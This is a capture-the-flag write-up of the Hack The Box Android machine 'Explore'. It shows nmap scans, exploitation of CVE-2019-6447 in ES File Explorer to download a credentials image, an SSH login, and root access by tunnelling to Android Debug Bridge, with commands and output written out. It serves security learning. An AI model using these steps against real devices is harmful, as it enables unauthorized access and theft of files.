---
layout: post
title: "HTB: Explore"
author: Andrew Cherney
date: 2023-02-20 20:18:32
tags: htb easy-box android cve ssh-tunneling
icon: "assets/icons/explore.png"
post_description: "Android can be a beast to pentest and enumerate, but this box does a decent job of giving leads. The credentials are found in what I can only assume is the user writing it down and taking  a picture not to forget. Then root can be gained through the locally open 5555 port for android debug bridge."
---

<h1>Summary</h1>

{{ page.post_description }}

<h1>Enumeration</h1>

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Explore]
└──╼ $nmap -sC 10.10.10.247
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-22 20:31 CST
Nmap scan report for 10.10.10.247
Host is up (0.054s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE    SERVICE
2222/tcp open     EtherNetIP-1
| ssh-hostkey: 
|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
5555/tcp filtered freeciv
```

These ports certainly are odd and indicate it is an android device. How do I know? Well first this is an Android box, but second that port 5555 is the Android Debug Bridge used for basic app maintenance (installing/debuging) and can give a command prompt. The state is filtered however, so likely this is hosted as a service but filtered to local traffic, I'll try that as a last resort. 

<h2>Ports near the void</h2>

It does strike me as odd that there are only these two ports. I decide to scan all of the ports available to see if anything turns up.

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Explore]
└──╼ $nmap -sC 10.10.10.247 -p1-65535
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-22 21:58 CST
Nmap scan report for 10.10.10.247
Host is up (0.057s latency).
Not shown: 65530 closed tcp ports (conn-refused)
PORT      STATE    SERVICE
2222/tcp  open     EtherNetIP-1
| ssh-hostkey: 
|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
5555/tcp  filtered freeciv
33391/tcp open     unknown
42135/tcp open     unknown
59777/tcp open     unknown
```

A little better, but not by much. In order my search yields that 33391 is unassigned, 42135 is occasionally for game servers, and 59777 is almost certainly ES File Explorer. Right out of the gate on speedguide.net it states the service has been vulnerable to CVE-2019-6447, an arbitrary file read and application execution vulnerability. 

<h1>User as u0_a76</h1>

<h2>CVE-2019-6447</h2>

[This is a proof of concept for that CVE](https://www.exploit-db.com/exploits/50070) and looking through it if you just send a post with json it'll let you run local commands on the Android shell. That said likely I cannot get a reverse shell since Android restricts its command usage pretty well. Instead with this remote command usage I can enumerate the system and search for hidden password files or images.

The commands the exploit denotes are as follows:

```
    print("  listFiles         : List all Files.")
    print("  listPics          : List all Pictures.")
    print("  listVideos        : List all videos.")
    print("  listAudios        : List all audios.")
    print("  listApps          : List Applications installed.")
    print("  listAppsSystem    : List System apps.")
    print("  listAppsPhone     : List Communication related apps.")
    print("  listAppsSdcard    : List apps on the SDCard.")
    print("  listAppsAll       : List all Application.")
    print("  getFile           : Download a file.")
    print("  getDeviceInfo     : Get device info.")
```

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Explore]
└──╼ $python3 CVE-2019-6447.py getDeviceInfo 10.10.10.247

==================================================================
|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
|                Coded By : Nehal a.k.a PwnerSec                 |
==================================================================

name : VMware Virtual Platform
ftpRoot : /sdcard
ftpPort : 3721
```

In running the basic list commands in order I come across the file named **creds.jpg** which seems odd.

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Explore]
└──╼ $python3 CVE-2019-6447.py listPics 10.10.10.247

==================================================================
|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
|                Coded By : Nehal a.k.a PwnerSec                 |
==================================================================

name : concept.jpg
time : 4/21/21 02:38:08 AM
location : /storage/emulated/0/DCIM/concept.jpg
size : 135.33 KB (138,573 Bytes)

name : anc.png
time : 4/21/21 02:37:50 AM
location : /storage/emulated/0/DCIM/anc.png
size : 6.24 KB (6,392 Bytes)

name : creds.jpg
time : 4/21/21 02:38:18 AM
location : /storage/emulated/0/DCIM/creds.jpg
size : 1.14 MB (1,200,401 Bytes)

name : 224_anc.png
time : 4/21/21 02:37:21 AM
location : /storage/emulated/0/DCIM/224_anc.png
size : 124.88 KB (127,876 Bytes)
```

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Explore]
└──╼ $python3 CVE-2019-6447.py getFile 10.10.10.247 /storage/emulated/0/DCIM/creds.jpg

==================================================================
|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
|                Coded By : Nehal a.k.a PwnerSec                 |
==================================================================

[+] Downloading file...
[+] Done. Saved as `out.dat`.
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Explore]
└──╼ $mv out.dat creds.jpg
```

![credentials](/img/explore/Explore_credentials.png)

<code>kristi</code> with password <code>Kr1sT!5h@Rp3xPl0r3!</code> should give us access. So with my machinations I still am not sure why in the initial cracking of this box I was thinking since port 8080 is http traffic that port 2222 would be ssh traffic. I tried it then and it worked.

In retrospect I see that in the initial nmap scan the port 2222 returns an ssh-hostkey, which is indicative of some sort of server with ssh connection capabilities.

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Explore]
└──╼ $ssh kristi@10.10.10.247 -p 2222
Password authentication
Password: 
:/ $ whoami
u0_a76
```

<h1>Root</h1>

<h2>SSH Tunneling</h2>

So that port on 5555 is Android Debug Bridge, and I have a hunch if I ssh tunnel to the machine I can run remote commands. 

```bash
ssh kristi@10.10.10.247 -p 2222 -L 5555:localhost:5555
```

<h2>Android Debug Bridge</h2>

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Explore]
└──╼ $adb devices
List of devices attached
emulator-5554	device
```

Well that's promising. Now I can put adb in root mode and gain a root shell on the machine.

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Explore]
└──╼ $adb root
* daemon not running; starting now at tcp:5037
* daemon started successfully
restarting adbd as root
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Explore]
└──╼ $adb -s emulator-5554 shell
x86_64:/ # whoami                                                                          
root
```

<h2>Finding the Flags</h2>

Since this is an android system and there are no home or root directories I need to find the flags. I suspect they might be in **/data** but I can toss out a search for both.

```bash
x86_64:/data # find / -name "root.txt" 2>/dev/null
/data/root.txt
1|x86_64:/data # find / -name "user.txt" 2>/dev/null                                       
/storage/emulated/0/user.txt
/mnt/runtime/write/emulated/0/user.txt
/mnt/runtime/read/emulated/0/user.txt
/mnt/runtime/default/emulated/0/user.txt
/data/media/0/user.txt
1|x86_64:/data # cat /data/root.txt
f04fc82b6d49b41c9---------------
x86_64:/data # cat /data/media/0/user.txt
f32017174c7c7e8f5---------------
```
